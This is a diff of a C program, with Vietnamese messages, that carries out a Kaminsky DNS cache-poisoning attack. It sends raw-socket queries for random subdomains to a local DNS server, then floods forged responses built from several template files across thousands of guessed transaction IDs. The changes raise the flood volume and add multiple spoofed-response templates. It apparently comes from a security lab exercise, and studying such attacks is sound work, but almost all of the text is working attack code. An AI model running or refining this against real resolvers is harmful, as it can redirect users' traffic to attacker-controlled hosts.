@@ -6,10 +6,12 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <time.h>
+#include <dirent.h>
 
-#define MAX_FILE_SIZE 1000000
+#define MAX_FILE_SIZE 4096
+#define MAX_RESP_TEMPLATES 32
+#define TXIDS_PER_QUERY 3000
 
-/* IP Header */
 struct ipheader {
   unsigned char      iph_ihl:4,
                      iph_ver:4;
@@ -25,73 +27,134 @@ struct ipheader {
   struct  in_addr    iph_destip;
 };
 
-void send_raw_packet(int sock, char * buffer, int pkt_size);
+struct resp_template {
+  unsigned char data[MAX_FILE_SIZE];
+  int size;
+};
 
-int main()
+static unsigned char ip_req[MAX_FILE_SIZE];
+static struct resp_template responses[MAX_RESP_TEMPLATES];
+
+void send_raw_packet(int sock, char *buffer, int pkt_size);
+
+static int load_file(const char *path, unsigned char *buf, int max_size)
 {
-  setvbuf(stdout, NULL, _IONBF, 0);
-  srand(time(NULL));
+  FILE *fp = fopen(path, "rb");
+  int n;
 
-  // 1. Doc file ip_req.bin
-  FILE * f_req = fopen("ip_req.bin", "rb");
-  if (!f_req) {
-     perror("Khong the mo file 'ip_req.bin'");
-     exit(1);
+  if (!fp) {
+    perror(path);
+    return -1;
   }
-  unsigned char ip_req[MAX_FILE_SIZE];
-  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
-  fclose(f_req);
+  n = (int)fread(buf, 1, max_size, fp);
+  fclose(fp);
+  return n;
+}
 
-  // 2. Doc file ip_resp.bin
-  FILE * f_resp = fopen("ip_resp.bin", "rb");
-  if (!f_resp) {
-     perror("Khong the mo file 'ip_resp.bin'");
-     exit(1);
-  }
-  unsigned char ip_resp[MAX_FILE_SIZE];
-  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
-  fclose(f_resp);
+static int load_resp_templates(void)
+{
+  DIR *dir;
+  struct dirent *ent;
+  int count = 0;
+  char path[300];
 
-  // 3. Khoi tao raw socket dung chung de dat toc do cao nhat
-  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-  if (sock < 0) {
-      perror("Khong the khoi tao Raw Socket (can chay voi sudo)");
-      exit(1);
+  dir = opendir(".");
+  if (!dir) {
+    perror("opendir");
+    return -1;
   }
+
+  while ((ent = readdir(dir)) != NULL && count < MAX_RESP_TEMPLATES) {
+    size_t name_len;
+
+    if (strncmp(ent->d_name, "ip_resp", 7) != 0) {
+      continue;
+    }
+    name_len = strlen(ent->d_name);
+    if (name_len < 5 || strcmp(ent->d_name + name_len - 4, ".bin") != 0) {
+      continue;
+    }
+    if (snprintf(path, sizeof(path), "./%s", ent->d_name) >= (int)sizeof(path)) {
+      continue;
+    }
+    responses[count].size = load_file(path, responses[count].data, MAX_FILE_SIZE);
+    if (responses[count].size <= 0) {
+      continue;
+    }
+    printf("[*] Nap mau phan hoi: %s (%d bytes)\n", ent->d_name, responses[count].size);
+    count++;
+  }
+  closedir(dir);
+  return count;
+}
+
+int main(void)
+{
+  int n_req;
+  int resp_count;
+  int sock;
   int enable = 1;
+  char alphabet[27] = "abcdefghijklmnopqrstuvwxyz";
+  int burst = 0;
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  srand((unsigned int)time(NULL));
+
+  n_req = load_file("ip_req.bin", ip_req, MAX_FILE_SIZE);
+  if (n_req <= 0) {
+    fprintf(stderr, "Khong the mo file 'ip_req.bin'\n");
+    return 1;
+  }
+
+  resp_count = load_resp_templates();
+  if (resp_count <= 0) {
+    fprintf(stderr, "Khong tim thay file mau ip_resp*.bin\n");
+    return 1;
+  }
+
+  sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+  if (sock < 0) {
+    perror("Khong the khoi tao Raw Socket");
+    return 1;
+  }
   setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
 
-  char a[26] = "abcdefghijklmnopqrstuvwxyz";
-  int count = 0;
   printf("=== BAT DAU TAN CONG KAMINSKY DNS CACHE POISONING ===\n");
+  printf("[*] So mau Response gia mao: %d\n", resp_count);
   printf("[*] Dang ban query va goi tin gia mao toi Local DNS Server...\n");
 
   while (1) {
-    // Tao subdomain ngau nhien co do dai 5 ky tu
     char name[6];
+    int k;
+    int t;
+    int i;
+
     name[5] = '\0';
-    for (int k = 0; k < 5; k++) {
-        name[k] = a[rand() % 26];
+    for (k = 0; k < 5; k++) {
+      name[k] = alphabet[rand() % 26];
     }
 
-    // Buoc 1: Sua ten mien trong goi query (offset = 41) va gui toi Local DNS Server
     memcpy(ip_req + 41, name, 5);
     send_raw_packet(sock, (char *)ip_req, n_req);
+    /* Cho BIND mo recursive query (TXID that) truoc khi flood spoof. */
+    usleep(800);
 
-    // Buoc 2: Sua ten mien trong goi response (Question: offset 41, Answer: offset 64)
-    memcpy(ip_resp + 41, name, 5);
-    memcpy(ip_resp + 64, name, 5);
-
-    // Buoc 3: Ban hang loat goi tin DNS Response gia mao voi cac Transaction ID khac nhau
-    for (int i = 0; i < 300; i++) {
-        unsigned short id = htons(rand() % 65536);
-        memcpy(ip_resp + 28, &id, 2);
-        send_raw_packet(sock, (char *)ip_resp, n_resp);
+    for (t = 0; t < resp_count; t++) {
+      memcpy(responses[t].data + 41, name, 5);
+      memcpy(responses[t].data + 64, name, 5);
     }
 
-    count++;
-    if (count % 50 == 0) {
-        printf("[+] Da gui %d dot query va phan hoi gia mao...\n", count);
+    for (i = 0; i < TXIDS_PER_QUERY; i++) {
+      unsigned short id = htons((unsigned short)(rand() % 65536));
+      for (t = 0; t < resp_count; t++) {
+        memcpy(responses[t].data + 28, &id, 2);
+        send_raw_packet(sock, (char *)responses[t].data, responses[t].size);
+      }
+    }
+
+    burst++;
+    if (burst % 50 == 0) {
+      printf("[+] Da gui %d dot query va phan hoi gia mao...\n", burst);
     }
   }
 
@@ -99,13 +162,13 @@ int main()
   return 0;
 }
 
-void send_raw_packet(int sock, char * buffer, int pkt_size)
+void send_raw_packet(int sock, char *buffer, int pkt_size)
 {
   struct sockaddr_in dest_info;
-  struct ipheader *ip = (struct ipheader *) buffer;
+  struct ipheader *ip = (struct ipheader *)buffer;
 
+  memset(&dest_info, 0, sizeof(dest_info));
   dest_info.sin_family = AF_INET;
   dest_info.sin_addr = ip->iph_destip;
-
   sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info));
 }
